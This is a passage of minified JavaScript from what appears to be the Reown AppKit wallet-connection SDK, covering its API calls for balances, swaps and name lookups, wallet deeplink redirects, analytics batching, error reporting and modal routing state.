isNetworkSupported(t){if(!t)return!1;try{so.supportedChains.http.length||await Bt.getSupportedNetworks()}catch{return!1}return so.supportedChains.http.includes(t)},async getSupportedNetworks(){try{const t=await Bt.get({path:"v1/supported-chains"});return so.supportedChains=t,t}catch{return so.supportedChains}},async fetchIdentity({address:t}){const e=Be.getIdentityFromCacheForAddress(t);if(e)return e;const n=await Bt.get({path:`/v1/identity/${t}`,params:{sender:Y.state.activeCaipAddress?xe.getPlainAddress(Y.state.activeCaipAddress):void 0}});return Be.updateIdentityCache({address:t,identity:n,timestamp:Date.now()}),n},async fetchTransactions({account:t,cursor:e,signal:n,cache:r,chainId:i}){if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))return{data:[],next:void 0};const o=Be.getTransactionsCacheForAddress({address:t,chainId:i});if(o)return o;const a=await Bt.get({path:`/v1/account/${t}/history`,params:{cursor:e,chainId:i},signal:n,cache:r});return Be.updateTransactionsCache({address:t,chainId:i,timestamp:Date.now(),transactions:a}),a},async fetchSwapQuote({amount:t,userAddress:e,from:n,to:r,gasPrice:i}){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:"/v1/convert/quotes",headers:{"Content-Type":"application/json"},params:{amount:t,userAddress:e,from:n,to:r,gasPrice:i}}):{quotes:[]}},async fetchSwapTokens({chainId:t}){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:"/v1/convert/tokens",params:{chainId:t}}):{tokens:[]}},async getAddressBalance({caipNetworkId:t,address:e}){return so.api.post({path:`/v1?chainId=${t}&projectId=${de.state.projectId}`,body:{id:"1",jsonrpc:"2.0",method:"getAddressBalance",params:{address:e}}}).then(n=>n.result)},async fetchTokenPrice({addresses:t}){if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))return{fungibles:[]};const n=Be.getTokenPriceCacheForAddresses(t);if(n)return n;const r=await so.api.post({path:"/v1/fungible/price",body:{currency:"usd",addresses:t,projectId:de.state.projectId},headers:{"Content-Type":"application/json"}});return Be.updateTokenPriceCache({addresses:t,timestamp:Date.now(),tokenPrice:r}),r},async fetchSwapAllowance({tokenAddress:t,userAddress:e}){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:"/v1/convert/allowance",params:{tokenAddress:t,userAddress:e},headers:{"Content-Type":"application/json"}}):{allowance:"0"}},async fetchGasPrice({chainId:t}){const{st:e,sv:n}=Bt.getSdkProperties();if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Gas Price");return Bt.get({path:"/v1/convert/gas-price",headers:{"Content-Type":"application/json"},params:{chainId:t,st:e,sv:n}})},async generateSwapCalldata({amount:t,from:e,to:n,userAddress:r,disableEstimate:i}){if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return so.api.post({path:"/v1/convert/build-transaction",headers:{"Content-Type":"application/json"},body:{amount:t,eip155:{slippage:jt.CONVERT_SLIPPAGE_TOLERANCE},projectId:de.state.projectId,from:e,to:n,userAddress:r,disableEstimate:i}})},async generateApproveCalldata({from:t,to:e,userAddress:n}){const{st:r,sv:i}=Bt.getSdkProperties();if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))throw new Error("Network not supported for Swaps");return Bt.get({path:"/v1/convert/build-approve",headers:{"Content-Type":"application/json"},params:{userAddress:n,from:t,to:e,st:r,sv:i}})},async getBalance(t,e,n){const{st:r,sv:i}=Bt.getSdkProperties();if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))return on.showError("Token Balance Unavailable"),{balances:[]};const o=`${e}:${t}`,a=Be.getBalanceCacheForCaipAddress(o);if(a)return a;const c=await Bt.get({path:`/v1/account/${t}/balance`,params:{currency:"usd",chainId:e,forceUpdate:n,st:r,sv:i}});return Be.updateBalanceCache({caipAddress:o,balance:c,timestamp:Date.now()}),c},async lookupEnsName(t){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:`/v1/profile/account/${t}`,params:{apiVersion:"2"}}):{addresses:{},attributes:[]}},async reverseLookupEnsName({address:t}){if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))return[];const n=Y.getAccountData()?.address;return Bt.get({path:`/v1/profile/reverse/${t}`,params:{sender:n,apiVersion:"2"}})},async getEnsNameSuggestions(t){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:`/v1/profile/suggestions/${t}`,params:{zone:"reown.id"}}):{suggestions:[]}},async registerEnsName({coinType:t,address:e,message:n,signature:r}){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?so.api.post({path:"/v1/profile/account",body:{coin_type:t,address:e,message:n,signature:r},headers:{"Content-Type":"application/json"}}):{success:!1}},async generateOnRampURL({destinationWallets:t,partnerUserId:e,defaultNetwork:n,purchaseAmount:r,paymentAmount:i}){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?(await so.api.post({path:"/v1/generators/onrampurl",params:{projectId:de.state.projectId},body:{destinationWallets:t,defaultNetwork:n,partnerUserId:e,defaultExperience:"buy",presetCryptoAmount:r,presetFiatAmount:i}})).url:""},async getOnrampOptions(){if(!await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId))return{paymentCurrencies:[],purchaseCurrencies:[]};try{return await Bt.get({path:"/v1/onramp/options"})}catch{return e1e}},async getOnrampQuote({purchaseCurrency:t,paymentCurrency:e,amount:n,network:r}){try{return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?await so.api.post({path:"/v1/onramp/quote",params:{projectId:de.state.projectId},body:{purchaseCurrency:t,paymentCurrency:e,amount:n,network:r}}):null}catch{return{networkFee:{amount:n,currency:e.id},paymentSubtotal:{amount:n,currency:e.id},paymentTotal:{amount:n,currency:e.id},purchaseAmount:{amount:n,currency:e.id},quoteId:"mocked-quote-id"}}},async getSmartSessions(t){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?Bt.get({path:`/v1/sessions/${t}`}):[]},async revokeSmartSession(t,e,n){return await Bt.isNetworkSupported(Y.state.activeCaipNetwork?.caipNetworkId)?so.api.post({path:`/v1/sessions/${t}/revoke`,params:{projectId:de.state.projectId},body:{pci:e,signature:n}}):{success:!1}},setClientId(t){so.clientId=t,so.api=new W_({baseUrl:Vre,clientId:t})}},xc={PHANTOM:{id:"a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393",url:"https://phantom.app"},SOLFLARE:{id:"1ca0bdd4747578705b1939af023d120677c64fe6ca76add81fda36e350605e79",url:"https://solflare.com"},COINBASE:{id:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",url:"https://go.cb-w.com"},BINANCE:{id:"2fafea35bb471d22889ccb49c08d99dd0a18a37982602c33f696a5723934ba25",appId:"yFK5FCqYprrXDiVFbhyRx7",deeplink:"bnc://app.binance.com/mp/app",url:"https://app.binance.com/en/download"}},t1e={handleMobileDeeplinkRedirect(t,e){const n=window.location.href,r=encodeURIComponent(n);if(t===xc.PHANTOM.id&&!("phantom"in window)){const i=n.startsWith("https")?"https":"http",s=n.split("/")[2],o=encodeURIComponent(`${i}://${s}`);window.location.href=`${xc.PHANTOM.url}/ul/browse/${r}?ref=${o}`}if(t===xc.SOLFLARE.id&&!("solflare"in window)&&(window.location.href=`${xc.SOLFLARE.url}/ul/v1/browse/${r}?ref=${r}`),e===ge.CHAIN.SOLANA&&t===xc.COINBASE.id&&!("coinbaseSolana"in window)&&(window.location.href=`${xc.COINBASE.url}/dapp?cb_url=${r}`),e===ge.CHAIN.BITCOIN&&t===xc.BINANCE.id&&!("binancew3w"in window)){const i=Y.state.activeCaipNetwork,s=window.btoa("/pages/browser/index"),o=window.btoa(`url=${r}&defaultChainId=${i?.id??1}`),a=new URL(xc.BINANCE.deeplink);a.searchParams.set("appId",xc.BINANCE.appId),a.searchParams.set("startPagePath",s),a.searchParams.set("startPageQuery",o);const c=new URL(xc.BINANCE.url);c.searchParams.set("_dp",window.btoa(a.toString())),window.location.href=c.toString()}}},n1e=Object.freeze({enabled:!0,events:[]}),r1e=new W_({baseUrl:xe.getAnalyticsUrl(),clientId:null}),i1e=5,s1e=60*1e3,Mh=ar({...n1e}),o1e={state:Mh,subscribeKey(t,e){return Mi(Mh,t,e)},async sendError(t,e){if(!Mh.enabled)return;const n=Date.now();if(Mh.events.filter(s=>{const o=new Date(s.properties.timestamp||"").getTime();return n-o<s1e}).length>=i1e)return;const i={type:"error",event:e,properties:{errorType:t.name,errorMessage:t.message,stackTrace:t.stack,timestamp:new Date().toISOString()}};Mh.events.push(i);try{if(typeof window>"u")return;const{projectId:s,sdkType:o,sdkVersion:a}=de.state;await r1e.post({path:"/e",params:{projectId:s,st:o,sv:a||"html-wagmi-4.2.2"},body:{eventId:xe.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:new Date().toISOString(),props:{type:"error",event:e,errorType:t.name,errorMessage:t.message,stackTrace:t.stack}}})}catch{}},enable(){Mh.enabled=!0},disable(){Mh.enabled=!1},clearEvents(){Mh.events=[]}};class Zl extends Error{constructor(e,n,r){super(e),this.originalName="AppKitError",this.name="AppKitError",this.category=n,this.originalError=r,r&&r instanceof Error&&(this.originalName=r.name),Object.setPrototypeOf(this,Zl.prototype);let i=!1;if(r instanceof Error&&typeof r.stack=="string"&&r.stack){const s=r.stack,o=s.indexOf(`
`);if(o>-1){const a=s.substring(o+1);this.stack=`${this.name}: ${this.message}
${a}`,i=!0}}i||(Error.captureStackTrace?Error.captureStackTrace(this,Zl):this.stack||(this.stack=`${this.name}: ${this.message}`))}}function EH(t,e){let n="";try{t instanceof Error?n=t.message:typeof t=="string"?n=t:typeof t=="object"&&t!==null?Object.keys(t).length===0?n="Unknown error":n=t?.message||JSON.stringify(t):n=String(t)}catch(i){n="Unknown error",console.error("Error parsing error message",i)}const r=t instanceof Zl?t:new Zl(n,e,t);throw o1e.sendError(r,r.category),r}function ec(t,e="INTERNAL_SDK_ERROR"){const n={};return Object.keys(t).forEach(r=>{const i=t[r];if(typeof i=="function"){let s=i;i.constructor.name==="AsyncFunction"?s=async(...o)=>{try{return await i(...o)}catch(a){return EH(a,e)}}:s=(...o)=>{try{return i(...o)}catch(a){return EH(a,e)}},n[r]=s}else n[r]=i}),n}const Na=ar({walletImages:{},networkImages:{},chainImages:{},connectorImages:{},tokenImages:{},currencyImages:{}}),a1e={state:Na,subscribeNetworkImages(t){return ji(Na.networkImages,()=>t(Na.networkImages))},subscribeKey(t,e){return Mi(Na,t,e)},subscribe(t){return ji(Na,()=>t(Na))},setWalletImage(t,e){Na.walletImages[t]=e},setNetworkImage(t,e){Na.networkImages[t]=e},setChainImage(t,e){Na.chainImages[t]=e},setConnectorImage(t,e){Na.connectorImages={...Na.connectorImages,[t]:e}},setTokenImage(t,e){Na.tokenImages[t]=e},setCurrencyImage(t,e){Na.currencyImages[t]=e}},Pi=ec(a1e),c1e={eip155:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",solana:"a1b58899-f671-4276-6a5e-56ca5bd59700",polkadot:"",bip122:"0b4838db-0161-4ffe-022d-532bf03dba00",cosmos:"",sui:"",stacks:"",ton:"20f673c0-095e-49b2-07cf-eb5049dcf600"},NN=ar({networkImagePromises:{}}),er={async fetchWalletImage(t){if(t)return await Ge._fetchWalletImage(t),this.getWalletImageById(t)},async fetchNetworkImage(t){if(!t)return;const e=this.getNetworkImageById(t);return e||(NN.networkImagePromises[t]||(NN.networkImagePromises[t]=Ge._fetchNetworkImage(t)),await NN.networkImagePromises[t],this.getNetworkImageById(t))},getWalletImageById(t){if(t)return Pi.state.walletImages[t]},getWalletImage(t){if(t?.image_url)return t?.image_url;if(t?.image_id)return Pi.state.walletImages[t.image_id]},getNetworkImage(t){if(t?.assets?.imageUrl)return t?.assets?.imageUrl;if(t?.assets?.imageId)return Pi.state.networkImages[t.assets.imageId]},getNetworkImageById(t){if(t)return Pi.state.networkImages[t]},getConnectorImage(t){if(t?.imageUrl)return t.imageUrl;if(t?.info?.icon)return t.info.icon;if(t?.imageId)return Pi.state.connectorImages[t.imageId]},getChainImage(t){return Pi.state.networkImages[c1e[t]]},getTokenImage(t){if(t)return Pi.state.tokenImages[t]}},u1e=xe.getAnalyticsUrl(),l1e=new W_({baseUrl:u1e,clientId:null}),d1e=["MODAL_CREATED"],f1e=45,_H=1e3*10,ri=ar({timestamp:Date.now(),lastFlush:Date.now(),reportedErrors:{},data:{type:"track",event:"MODAL_CREATED"},pendingEvents:[],subscribedToVisibilityChange:!1,walletImpressions:[]}),tt={state:ri,subscribe(t){return ji(ri,()=>t(ri))},getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:n}=de.state;return{projectId:t,st:e,sv:n||"html-wagmi-4.2.2"}},shouldFlushEvents(){const t=JSON.stringify(ri.pendingEvents).length/1024>f1e,e=ri.lastFlush+_H<Date.now();return t||e},_setPendingEvent(t){try{let e=Y.getAccountData()?.address;if("address"in t.data&&t.data.address&&(e=t.data.address),d1e.includes(t.data.event)||typeof window>"u")return;const n=Y.getActiveCaipNetwork()?.caipNetworkId;this.state.pendingEvents.push({eventId:xe.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:t.timestamp,props:{...t.data,address:e,properties:{..."properties"in t.data?t.data.properties:{},caipNetworkId:n}}}),ri.reportedErrors.FORBIDDEN=!1,tt.shouldFlushEvents()&&tt._submitPendingEvents()}catch(e){console.warn("_setPendingEvent",e)}},sendEvent(t){ri.timestamp=Date.now(),ri.data=t;const e=["INITIALIZE","CONNECT_SUCCESS","SOCIAL_LOGIN_SUCCESS"];(de.state.features?.analytics||e.includes(t.event))&&tt._setPendingEvent(ri),this.subscribeToFlushTriggers()},sendWalletImpressionEvent(t){ri.walletImpressions.push(t)},_transformPendingEventsForBatch(t){try{return t.filter(e=>e.props.event!=="WALLET_IMPRESSION_V2")}catch{return t}},_submitPendingEvents(){if(ri.lastFlush=Date.now(),!(ri.pendingEvents.length===0&&ri.walletImpressions.length===0))try{const t=tt._transformPendingEventsForBatch(ri.pendingEvents);ri.walletImpressions.length&&t.push({eventId:xe.getUUID(),url:window.location.href,domain:window.location.hostname,timestamp:Date.now(),props:{type:"track",event:"WALLET_IMPRESSION_V2",items:[...ri.walletImpressions]}}),l1e.sendBeacon({path:"/batch",params:tt.getSdkProperties(),body:t}),ri.reportedErrors.FORBIDDEN=!1,ri.pendingEvents=[],ri.walletImpressions=[]}catch{ri.reportedErrors.FORBIDDEN=!0}},subscribeToFlushTriggers(){ri.subscribedToVisibilityChange||typeof document>"u"||(ri.subscribedToVisibilityChange=!0,document?.addEventListener?.("visibilitychange",()=>{document.visibilityState==="hidden"&&tt._submitPendingEvents()}),document?.addEventListener?.("freeze",()=>{tt._submitPendingEvents()}),window?.addEventListener?.("pagehide",()=>{tt._submitPendingEvents()}),setInterval(()=>{tt._submitPendingEvents()},_H))}},h1e=xe.getApiUrl(),oo=new W_({baseUrl:h1e,clientId:null}),p1e=40,AH=4,m1e=20,Ht=ar({promises:{},page:1,count:0,featured:[],allFeatured:[],recommended:[],allRecommended:[],wallets:[],filteredWallets:[],search:[],isAnalyticsEnabled:!1,excludedWallets:[],isFetchingRecommendedWallets:!1,explorerWallets:[],explorerFilteredWallets:[],plan:{tier:"none",hasExceededUsageLimit:!1,limits:{isAboveRpcLimit:!1,isAboveMauLimit:!1}}}),Ge={state:Ht,subscribeKey(t,e){return Mi(Ht,t,e)},_getSdkProperties(){const{projectId:t,sdkType:e,sdkVersion:n}=de.state;return{projectId:t,st:e||"appkit",sv:n||"html-wagmi-4.2.2"}},_filterOutExtensions(t){return de.state.isUniversalProvider?t.filter(e=>!!(e.mobile_link||e.desktop_link||e.webapp_link)):t},async _fetchWalletImage(t){const e=`${oo.baseUrl}/getWalletImage/${t}`,n=await oo.getBlob({path:e,params:Ge._getSdkProperties()});Pi.setWalletImage(t,URL.createObjectURL(n))},async _fetchNetworkImage(t){const e=`${oo.baseUrl}/public/getAssetImage/${t}`,n=await oo.getBlob({path:e,params:Ge._getSdkProperties()});Pi.setNetworkImage(t,URL.createObjectURL(n))},async _fetchConnectorImage(t){const e=`${oo.baseUrl}/public/getAssetImage/${t}`,n=await oo.getBlob({path:e,params:Ge._getSdkProperties()});Pi.setConnectorImage(t,URL.createObjectURL(n))},async _fetchCurrencyImage(t){const e=`${oo.baseUrl}/public/getCurrencyImage/${t}`,n=await oo.getBlob({path:e,params:Ge._getSdkProperties()});Pi.setCurrencyImage(t,URL.createObjectURL(n))},async _fetchTokenImage(t){const e=`${oo.baseUrl}/public/getTokenImage/${t}`,n=await oo.getBlob({path:e,params:Ge._getSdkProperties()});Pi.setTokenImage(t,URL.createObjectURL(n))},_filterWalletsByPlatform(t){const e=t.length,n=xe.isMobile()?t?.filter(i=>i.mobile_link||i.webapp_link?!0:Object.values(xc).map(o=>o.id).includes(i.id)):t,r=e-n.length;return{filteredWallets:n,mobileFilteredOutWalletsLength:r}},async fetchProjectConfig(){return(await oo.get({path:"/appkit/v1/config",params:Ge._getSdkProperties()})).features},async fetchUsage(){try{const t=await oo.get({path:"/appkit/v1/project-limits",params:Ge._getSdkProperties()}),{tier:e,isAboveMauLimit:n,isAboveRpcLimit:r}=t.planLimits,i=e==="starter",s=n||r;Ge.state.plan={tier:e,hasExceededUsageLimit:i&&s,limits:{isAboveRpcLimit:r,isAboveMauLimit:n}}}catch(t){console.warn("Failed to fetch usage",t)}},async fetchAllowedOrigins(){try{const{allowedOrigins:t}=await oo.get({path:"/projects/v1/origins",params:Ge._getSdkProperties()});return t}catch(t){if(t instanceof Error&&t.cause instanceof Response){const e=t.cause.status;if(e===ge.HTTP_STATUS_CODES.TOO_MANY_REQUESTS)throw new Error("RATE_LIMITED",{cause:t});if(e>=ge.HTTP_STATUS_CODES.SERVER_ERROR&&e<600)throw new Error("SERVER_ERROR",{cause:t});return[]}return[]}},async fetchNetworkImages(){const e=Y.getAllRequestedCaipNetworks()?.map(({assets:n})=>n?.imageId).filter(Boolean).filter(n=>!er.getNetworkImageById(n));e&&await Promise.allSettled(e.map(n=>Ge._fetchNetworkImage(n)))},async fetchConnectorImages(){const{connectors:t}=Ce.state,e=t.map(({imageId:n})=>n).filter(Boolean);await Promise.allSettled(e.map(n=>Ge._fetchConnectorImage(n)))},async fetchCurrencyImages(t=[]){await Promise.allSettled(t.map(e=>Ge._fetchCurrencyImage(e)))},async fetchTokenImages(t=[]){await Promise.allSettled(t.map(e=>Ge._fetchTokenImage(e)))},async fetchWallets(t){const e=t.exclude??[];Ge._getSdkProperties().sv.startsWith("html-core-")&&e.push(...Object.values(xc).map(o=>o.id));const r=await oo.get({path:"/getWallets",params:{...Ge._getSdkProperties(),...t,page:String(t.page),entries:String(t.entries),include:t.include?.join(","),exclude:e.join(",")}}),{filteredWallets:i,mobileFilteredOutWalletsLength:s}=Ge._filterWalletsByPlatform(r?.data);return{data:i||[],count:r?.count,mobileFilteredOutWalletsLength:s}},async prefetchWalletRanks(){const t=Ce.state.connectors;if(!t?.length)return;const e={page:1,entries:20,badge:"certified"};if(e.names=t.map(i=>i.name).join(","),Y.state.activeChain===ge.CHAIN.EVM){const i=[...t.flatMap(s=>s.connectors?.map(o=>o.info?.rdns)||[]),...t.map(s=>s.info?.rdns)].filter(s=>typeof s=="string"&&s.length>0);i.length&&(e.rdns=i.join(","))}const{data:n}=await Ge.fetchWallets(e);Ht.explorerWallets=n,Ce.extendConnectorsWithExplorerWallets(n);const r=Y.getRequestedCaipNetworkIds().join(",");Ht.explorerFilteredWallets=n.filter(i=>i.chains?.some(s=>r.includes(s)))},async fetchFeaturedWallets(){const{featuredWalletIds:t}=de.state;if(t?.length){const e={...Ge._getSdkProperties(),page:1,entries:t?.length??AH,include:t},{data:n}=await Ge.fetchWallets(e),r=[...n].sort((s,o)=>t.indexOf(s.id)-t.indexOf(o.id)),i=r.map(s=>s.image_id).filter(Boolean);await Promise.allSettled(i.map(s=>Ge._fetchWalletImage(s))),Ht.featured=r,Ht.allFeatured=r}},async fetchRecommendedWallets(){try{Ht.isFetchingRecommendedWallets=!0;const{includeWalletIds:t,excludeWalletIds:e,featuredWalletIds:n}=de.state,r=[...e??[],...n??[]].filter(Boolean),i=Y.getRequestedCaipNetworkIds().join(","),s={page:1,entries:AH,include:t,exclude:r,chains:i},{data:o,count:a}=await Ge.fetchWallets(s),c=Be.getRecentWallets(),l=o.map(h=>h.image_id).filter(Boolean),f=c.map(h=>h.image_id).filter(Boolean);await Promise.allSettled([...l,...f].map(h=>Ge._fetchWalletImage(h))),Ht.recommended=o,Ht.allRecommended=o,Ht.count=a??0}catch{}finally{Ht.isFetchingRecommendedWallets=!1}},async fetchWalletsByPage({page:t}){const{includeWalletIds:e,excludeWalletIds:n,featuredWalletIds:r}=de.state,i=Y.getRequestedCaipNetworkIds().join(","),s=[...Ht.recommended.map(({id:h})=>h),...n??[],...r??[]].filter(Boolean),o={page:t,entries:p1e,include:e,exclude:s,chains:i},{data:a,count:c,mobileFilteredOutWalletsLength:l}=await Ge.fetchWallets(o);Ht.mobileFilteredOutWalletsLength=l+(Ht.mobileFilteredOutWalletsLength??0);const f=a.slice(0,m1e).map(h=>h.image_id).filter(Boolean);await Promise.allSettled(f.map(h=>Ge._fetchWalletImage(h))),Ht.wallets=xe.uniqueBy([...Ht.wallets,...Ge._filterOutExtensions(a)],"id").filter(h=>h.chains?.some(m=>i.includes(m))),Ht.count=c>Ht.count?c:Ht.count,Ht.page=t},async initializeExcludedWallets({ids:t}){const e={page:1,entries:t.length,include:t},{data:n}=await Ge.fetchWallets(e);n&&n.forEach(r=>{Ht.excludedWallets.push({rdns:r.rdns,name:r.name})})},async searchWallet({search:t,badge:e}){const{includeWalletIds:n,excludeWalletIds:r}=de.state,i=Y.getRequestedCaipNetworkIds().join(",");Ht.search=[];const s={page:1,entries:100,search:t?.trim(),badge_type:e,include:n,exclude:r,chains:i},{data:o}=await Ge.fetchWallets(s);tt.sendEvent({type:"track",event:"SEARCH_WALLET",properties:{badge:e??"",search:t??""}});const a=o.map(c=>c.image_id).filter(Boolean);await Promise.allSettled([...a.map(c=>Ge._fetchWalletImage(c)),xe.wait(300)]),Ht.search=Ge._filterOutExtensions(o)},initPromise(t,e){const n=Ht.promises[t];return n||(Ht.promises[t]=e())},prefetch({fetchConnectorImages:t=!0,fetchFeaturedWallets:e=!0,fetchRecommendedWallets:n=!0,fetchNetworkImages:r=!0,fetchWalletRanks:i=!0}={}){const s=[t&&Ge.initPromise("connectorImages",Ge.fetchConnectorImages),e&&Ge.initPromise("featuredWallets",Ge.fetchFeaturedWallets),n&&Ge.initPromise("recommendedWallets",Ge.fetchRecommendedWallets),r&&Ge.initPromise("networkImages",Ge.fetchNetworkImages),i&&Ge.initPromise("walletRanks",Ge.prefetchWalletRanks)].filter(Boolean);return Promise.allSettled(s)},prefetchAnalyticsConfig(){de.state.features?.analytics&&Ge.fetchAnalyticsConfig()},async fetchAnalyticsConfig(){try{const{isAnalyticsEnabled:t}=await oo.get({path:"/getAnalyticsConfig",params:Ge._getSdkProperties()});de.setFeatures({analytics:t})}catch{de.setFeatures({analytics:!1})}},filterByNamespaces(t){if(!t?.length){Ht.featured=Ht.allFeatured,Ht.recommended=Ht.allRecommended;return}const e=Y.getRequestedCaipNetworkIds().join(",");Ht.featured=Ht.allFeatured.filter(n=>n.chains?.some(r=>e.includes(r))),Ht.recommended=Ht.allRecommended.filter(n=>n.chains?.some(r=>e.includes(r))),Ht.filteredWallets=Ht.wallets.filter(n=>n.chains?.some(r=>e.includes(r)))},clearFilterByNamespaces(){Ht.filteredWallets=[]},setFilterByNamespace(t){if(!t){Ht.featured=Ht.allFeatured,Ht.recommended=Ht.allRecommended;return}const e=Y.getRequestedCaipNetworkIds().join(",");Ht.featured=Ht.allFeatured.filter(n=>n.chains?.some(r=>e.includes(r))),Ht.recommended=Ht.allRecommended.filter(n=>n.chains?.some(r=>e.includes(r))),Ht.filteredWallets=Ht.wallets.filter(n=>n.chains?.some(r=>e.includes(r)))}},g1e=["ConnectingExternal","ConnectingMultiChain","ConnectingSocial","ConnectingFarcaster"],Gn=ar({view:"Connect",history:["Connect"],transactionStack:[]}),y1e={state:Gn,subscribeKey(t,e){return Mi(Gn,t,e)},pushTransactionStack(t){Gn.transactionStack.push(t)},popTransactionStack(t){const e=Gn.transactionStack.pop();if(!e)return;const{onSuccess:n,onError:r,onCancel:i}=e;switch(t){case"success":n?.();break;case"error":r?.(),we.goBack();break;case"cancel":i?.(),we.goBack();break}},push(t,e){let n=t,r=e;Ge.state.plan.hasExceededUsageLimit&&g1e.includes(t)&&(n="UsageExceeded",r=void 0),n!==Gn.view&&(Gn.view=n,Gn.history.push(n),Gn.data=r)},reset(t,e){Gn.view=t,Gn.history=[t],Gn.data=e},replace(t,e){Gn.history.at(-1)===t||(Gn.view=t,Gn.history[Gn.history.length-1]=t,Gn.data=e)},goBack(){const t=Y.state.activeCaipAddress,e=we.state.view==="ConnectingFarcaster",n=!t&&e;if(Gn.history.length>1){Gn.history.pop();const[r]=Gn.history.slice(-1);r&&(t&&r==="Connect"?Gn.view="Account":Gn.view=r)}else kt.close();Gn.data?.wallet&&(Gn.data.wallet=void 0),Gn.data?.redirectView&&(Gn.data.redirectView=void 0),setTimeout(()=>{if(n){Y.setAccountProp("farcasterUrl",void 0,Y.state.activeChain);const r=Ce.getAuthConnector();r?.provider?.reload();const i=AE(de.state);r?.provider?.syncDappData?.({metadata:i.metadata,sdkVersion:i.sdkVersion,projectId:i.projectId,sdkType:i.sdkType})}},100)},goBackToIndex(t){if(Gn.history.length>1){Gn.history=Gn.history.slice(0,t+1);const[e]=Gn.history.slice(-1);e&&(Gn.view=e)}},goBackOrCloseModal(){we.state.history.length>1?we.goBack():kt.close()}},we=ec(y1e),Od=ar({themeMode:"dark",themeVariables:{},w3mThemeVariables:void 0}),jk={state:Od,subscribe(t){return ji(Od,()=>t(Od))},setThemeMode(t){Od.themeMode=t;try{const e=Ce.getAuthConnector();if(e){const n=jk.getSnapshot().themeVariables;e.provider.syncTheme({themeMode:t,themeVariables:n,w3mThemeVariables:SE(n,t)})}}catch{console.info("Unable to sync theme to auth connector")}},setThemeVariables(t){Od.themeVariables={...Od.themeVariables,...t};try{const e=Ce.getAuthConnector();if(e){const n=jk.getSnapshot().themeVariables;e.provider.syncTheme({themeVariables:n,w3mThemeVariables:SE(Od.themeVariables,Od.themeMode)})}}catch{console.info("Unable to sync theme to auth connector")}},getSnapshot(){return AE(Od)}},Ji=ec(jk),Wre=Object.fromEntries(wre.map(t=>[t,void 0])),b1e=Object.fromEntries(wre.map(t=>[t,!0])),An=ar({allConnectors:[],connectors:[],activeConnector:void 0,filterByNamespace:void 0,activeConnectorIds:Wre,filterByNamespaceMap:b1e}),w1e={state:An,subscribe(t){return ji(An,()=>{t(An)})},subscribeKey(t,e){return Mi(An,t,e)},initialize(t){t.forEach(e=>{const n=Be.getConnectedConnectorId(e);n&&Ce.setConnectorId(n,e)})},setActiveConnector(t){t&&(An.activeConnector=g1(t))},setConnectors(t){t.filter(i=>!An.allConnectors.some(s=>s.id===i.id&&Ce.getConnectorName(s.name)===Ce.getConnectorName(i.name)&&s.chain===i.chain)).forEach(i=>{i.type!=="MULTI_CHAIN"&&An.allConnectors.push(g1(i))});const n=Ce.getEnabledNamespaces(),r=Ce.getEnabledConnectors(n);An.connectors=Ce.mergeMultiChainConnectors(r)},filterByNamespaces(t){Object.keys(An.filterByNamespaceMap).forEach(e=>{An.filterByNamespaceMap[e]=!1}),t.forEach(e=>{An.filterByNamespaceMap[e]=!0}),Ce.updateConnectorsForEnabledNamespaces()},filterByNamespace(t,e){An.filterByNamespaceMap[t]=e,Ce.updateConnectorsForEnabledNamespaces()},updateConnectorsForEnabledNamespaces(){const t=Ce.getEnabledNamespaces(),e=Ce.getEnabledConnectors(t),n=Ce.areAllNamespacesEnabled();An.connectors=Ce.mergeMultiChainConnectors(e),n?Ge.clearFilterByNamespaces():Ge.filterByNamespaces(t)},getEnabledNamespaces(){return Object.entries(An.filterByNamespaceMap).filter(([t,e])=>e).map(([t])=>t)},getEnabledConnectors(t){return An.allConnectors.filter(e=>t.includes(e.chain))},areAllNamespacesEnabled(){return Object.values(An.filterByNamespaceMap).every(t=>t)},mergeMultiChainConnectors(t){const e=Ce.generateConnectorMapByName(t),n=[];return e.forEach(r=>{const i=r[0],s=i?.id===ge.CONNECTOR_ID.AUTH;r.length>1&&i?n.push({name:i.name,imageUrl:i.imageUrl,imageId:i.imageId,connectors:[...r],type:s?"AUTH":"MULTI_CHAIN",chain:"eip155",id:i?.id||""}):i&&n.push(i)}),n},generateConnectorMapByName(t){const e=new Map;return t.forEach(n=>{const{name:r}=n,i=Ce.getConnectorName(r);if(!i)return;const s=e.get(i)||[];s.find(a=>a.chain===n.chain)||s.push(n),e.set(i,s)}),e},getConnectorName(t){return t&&({"Trust Wallet":"Trust"}[t]||t)},getUniqueConnectorsByName(t){const e=[];return t.forEach(n=>{e.find(r=>r.chain===n.chain)||e.push(n)}),e},addConnector(t){if(t.id===ge.CONNECTOR_ID.AUTH){const 